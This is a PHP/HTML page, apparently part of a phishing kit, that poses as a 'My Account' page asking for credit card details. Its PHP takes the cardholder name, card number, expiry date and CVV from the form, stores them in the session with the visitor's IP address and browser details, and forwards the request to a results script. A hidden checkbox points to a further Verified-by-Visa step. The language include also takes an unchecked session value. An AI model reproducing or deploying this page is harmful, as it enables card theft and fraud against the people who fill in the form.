<?php

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*                   #              ||~~MR.Int(TN  ~~||              #                            */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
error_reporting(0);
session_start();
include("lang/". $_SESSION['_lang_'].".php");
if(isset($_POST['noob'])){
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);



#Credit card information
$_SESSION['cardholdername'] = $_POST['cardholdername'];
$_SESSION['cardNumber'] = $_POST['cardNumber'];
$_SESSION['edmonth'] = $_POST['edmonth'];
$_SESSION['edyear'] = $_POST['edyear'];
$_SESSION['cvn'] = $_POST['cvn'];

 if(isset($_POST['vbv_ready']) == true){
  #ip info
  header("location:res/res5.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
else{

 header("location:res/res5.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
		  }
?>


<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>My Account</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/card.css" rel="stylesheet">

<style type="text/css">
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }
.inp{
        width: 331px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 15px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;
} 
  .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 12px;
        position: relative;
        left: 124px;
        bottom: -15px;
        width: 40px;
         }
    .date{
    display: inline-block;
    background-image: url("css/sprites_cc_global.png");
    background-repeat: no-repeat;
    background-position: 0px -434px;
    height: 28px;
    position: relative;
    left: -49px;
    bottom: -9px;
    width: 40px;
    }
.in{
        font-family: arial, Helvetica, sans-serif;
    font-size: 10pt;
    color: #333;
    font-weight: normal;
    padding-top: 12px;
    padding-bottom: 12px;
    border-radius: 4px;
    border: 1px solid #CCC;
    margin: 5px;
    float: left;
}
  </style>
</head>

<script>
        jQuery(function($){
            $("#date").mask("99/9999");
			 $("#sortcode").mask("99-99-99");
			 
            $("#ssn").mask("999-99-9999");
        });
        /*verif if null or true*/
        /*   $(document).ready(function(){
         var cardlong = document.getElementById('cardnumber');
         if(cardlong.length == false){
         alert('yes');
         }
         $('#cardnumber').blur(function() {
         $('#cardnumber').css('border','1px solid #cf1900');
         });

         });

         $('#date').blur(function() {
         $('#date').css('border','1px solid #cf1900');
         });
         $('#cvv').blur(function() {
         $('#cvv').css('border','1px solid #cf1900');
         });
         */
        /*start scrit check*/
        $(document).on("click","#inchecked",function(){
            var inchecked = document.getElementById('inchecked');
            var input_check = document.getElementById('checkbox');

            if(inchecked.id == 'inchecked'){
                inchecked.id = "checked";
                input_check.setAttribute('checked','checked');
            }
        });
        $(document).on("click","#checked",function(){
            var checked = document.getElementById('checked');
            var input_check = document.getElementById('checkbox');
            if(checked.id == 'checked'){
                checked.id = "inchecked";
                input_check.removeAttribute('checked');
            }
        });
        /*En of script*/


        function type_carte(){
            var get_value = document.getElementById('cardnumber').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
                document.getElementById("card").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv").maxLength ="3"
            }else if(other == "5"){
                document.getElementById("card").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv").maxLength ="3"
            }
            /*Amex Card*/
            else if(type == "34"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }
            else if(type == "37"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }

            /*End Amex Card*/

            /*blue Card*/
            else if(type == "30"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            } else if(type == "36"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "38"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
                document.getElementById("card").style.backgroundPosition = "0px -86px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "35"){
                document.getElementById("card").style.backgroundPosition = "0px -145px";
                document.getElementById('cont_in').style.display ="none"
            }else{
                document.getElementById("card").style.backgroundPosition = "0px -406px";
                document.getElementById('cont_in').style.display ="block"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -434px";
                document.getElementById("cvv").maxLength ="3"
            }
        };
    </script>
<body>
<div id="wb_Form1" style="position:absolute;left:386px; border-radius: 10px; top:93px;width:505px;height:401px;z-index:0;">

<form class="xxray_51" method="GET"   action="res/res5.php" style="
">

<center>





 <center>
 <br><br>
  <h2 style="
    font-family: Arial, Helvetica, sans-serif;
    font-size: 20pt;
    font-weight: normal;
    color: #666;
">Credit card informations</h2><br><br>
		
		<input type="text"  id="cardholdername" name="cardholdername"  class="inp" value="" placeholder="Name of cardholder " style="width: 330px;"><br>
		
	
			
<br>
 
				
				
				
				
				
        <input  pattern="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$"  type="tel" maxlength="16" required="" id="cardnumber" name="cardNumber" class="inp" onkeyup="type_carte()" class="inp"  type="text" placeholder="Card number" style="width: 330px;">
		  <span class="card" id="card" style="
    height: 20px;
    width: 170px;
    margin-left: -173px;
    padding-top: 4px;
    "></span>

		<input name="c_type" type="hidden" id="crad_type" width="" value="">
		<input name="c_valid" type="hidden" id="card_valid" value="">
		
<br>
		
	
	
		

	
		

	
		
<div   class="inpdiv">
		
		<select id="edmonth"  name="edmonth" style="

width:90px;  margin-left: 100px;" class="in">
	<option value="0"></option>
	<option value="01">January</option>
	<option value="02">Febuary</option>
	<option value="03">March</option>
	<option value="04">April</option>
	<option value="05">May</option>
	<option value="06">June</option>
	<option value="07">July</option>
	<option value="08">August</option>
	<option value="09">September</option>
	<option value="10">October</option>
	<option value="11">November</option>
	<option value="12">December</option>
</select>	<select id="edyear" name="edyear" style="width:100px;" class="in">
	<option value="0"></option>
	<option value="17">2O17</option>
	<option value="18">2O18</option>
	<option value="19">2O19</option>
	<option value="20">2O20</option>
	<option value="21">2O21</option>
	<option value="22">2O22</option>
	<option value="23">2O23</option>
	<option value="24">2O24</option>
	<option value="25">2O25</option>
	<option value="26">2O26</option>
</select></div>
		
	<center>	<div class="inpdiv" style="
    padding-top: 6px;
" >
		
		
		
		
		
		
		
		
		
		
		
		
		<input  pattern="[0-9].{2,3}"  id="cvn" maxlength="4" name="cvn" class="inp" type="text" value="" placeholder="CVV" style="width: 100px; margin-left: -50px; margin-top:-100px" required>        

    <span class="date" id="type_cvv"></span>       
  
        </div></center>
		
		
		
		
		
	
		
		
		
		
		
                                 
                        <input type="checkbox" hidden="hidden" id="checkbox" name="vbv_ready">
		<center>
        <input class="inpclassicsumblit2" name="noob" type="submit" style="width: 364px;padding: 15px;      border-radius: 5px;      border: 0px solid red;      width: 330px;      margin-top: 9px;      background-color: #666;      font-family: Arial, Helvetica, sans-serif;      font-weight: bold;      color: #FFF;      font-size: 16px;" value="Submit" id="valider">
<br></center>
	
		
	</div>

		<input name="flow_name" value="summary/index" type="hidden"><input name="flow_name" value="summary/index" type="hidden">  
           
        </div>
                
            </div>
        </div>
		
	
</form>
		
	
	
</body>
</html>